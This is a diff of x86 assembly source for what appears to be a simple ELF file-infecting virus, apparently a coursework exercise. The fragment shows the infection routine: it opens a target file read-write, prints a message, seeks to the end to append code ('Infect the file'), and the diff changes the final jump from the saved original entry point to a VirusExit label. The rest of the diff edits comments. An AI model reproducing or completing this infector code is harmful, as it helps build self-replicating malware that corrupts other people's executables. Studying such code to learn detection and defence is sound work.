@@ -63,6 +63,7 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
+	; Open file in FileName
 	call get_my_loc
 	add ebx, FileName			; Opening file in FileName
 	open ebx, RDWR, 0x777
@@ -78,11 +79,11 @@ _start:
 	jmp infect
 
 infect:
-	; first print Outstr to STDOUT
+	; Print Outstr to STDOUT
 	call get_my_loc
 	add ebx, OutStr
 	write 1, ebx, 32
-	
+
 	; Infect the file
 	lseek FD, 0, SEEK_END
 	mov esi, eax				; Save file size in esi
@@ -108,10 +109,7 @@ infect:
 	lseek FD, 0, SEEK_SET
 
 	close FD
-	call get_my_loc
-	add ebx, PreviousEntryPoint
-	mov eax, [ebx]
-	jmp eax
+	jmp VirusExit
 
 not_elf:
 	close FD
